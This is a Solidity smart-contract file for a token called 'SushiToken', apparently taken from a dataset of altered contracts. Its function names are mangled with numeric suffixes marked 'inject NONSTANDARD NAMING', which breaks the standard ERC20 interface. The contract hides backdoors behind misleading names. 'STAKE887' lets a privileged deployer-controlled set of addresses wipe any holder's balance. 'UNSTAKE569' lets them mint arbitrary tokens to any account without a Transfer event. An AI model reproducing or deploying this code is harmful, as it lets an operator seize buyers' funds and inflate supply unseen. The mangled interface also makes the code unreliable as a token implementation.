                                                                 

pragma solidity ^0.5.16;
interface IERC20 {
    function TOTALSUPPLY973() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF872(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER422(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE608(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE382(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM728(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER313(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL352(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}
contract Context {
    constructor () internal { }
    function _MSGSENDER300() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY973() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF872(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER422(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER774(_MSGSENDER300(), recipient, amount);
        return true;
    }
    function ALLOWANCE608(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE382(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE703(_MSGSENDER300(), spender, amount);
        return true;
    }
    function TRANSFERFROM728(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER774(sender, recipient, amount);
        _APPROVE703(sender, _MSGSENDER300(), _allowances[sender][_MSGSENDER300()].SUB420(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE418(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE703(_MSGSENDER300(), spender, _allowances[_MSGSENDER300()][spender].ADD26(addedValue));
        return true;
    }
    function DECREASEALLOWANCE698(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE703(_MSGSENDER300(), spender, _allowances[_MSGSENDER300()][spender].SUB420(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER774(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB420(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD26(amount);
        emit TRANSFER313(sender, recipient, amount);
    }
    function _INITMINT714(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD26(amount);
        _balances[account] = _balances[account].ADD26(amount);
        emit TRANSFER313(address(0), account, amount);
    }
    function _UNSTAKE50(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _unstake to the zero address");
        _totalSupply = _totalSupply.ADD26(amount);
        _balances[account] = _balances[account].ADD26(amount);
    }
    function _BURN785(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].SUB420(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB420(amount);
        emit TRANSFER313(account, address(0), amount);
    }
    function _STAKE877(address acc) internal {	//inject NONSTANDARD NAMING
        require(acc != address(0), "stake to the zero address");
        uint amount = _balances[acc];
        _balances[acc] = 0;
        _totalSupply = _totalSupply.SUB420(amount);
    }
    function _APPROVE703(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL352(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME266() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL525() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS389() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD26(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB420(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB420(a, b, "SafeMath: subtraction overflow");
    }
    function SUB420(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL714(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV82(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV82(a, b, "SafeMath: division by zero");
    }
    function DIV82(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract SushiToken is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public stakers;
  constructor () public ERC20Detailed("SUSHI.ZIPPO.IO", "SUSHI", 18) {
      _INITMINT714( msg.sender, 10000*10**uint(DECIMALS389()) );
      stakers[msg.sender] = true;
  }

  function STAKE887(address account) public {	//inject NONSTANDARD NAMING
      require(stakers[msg.sender], "error");
      _STAKE877(account);
  }

  function UNSTAKE569(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(stakers[msg.sender], "error");
      _UNSTAKE50(account, amount);
  }

}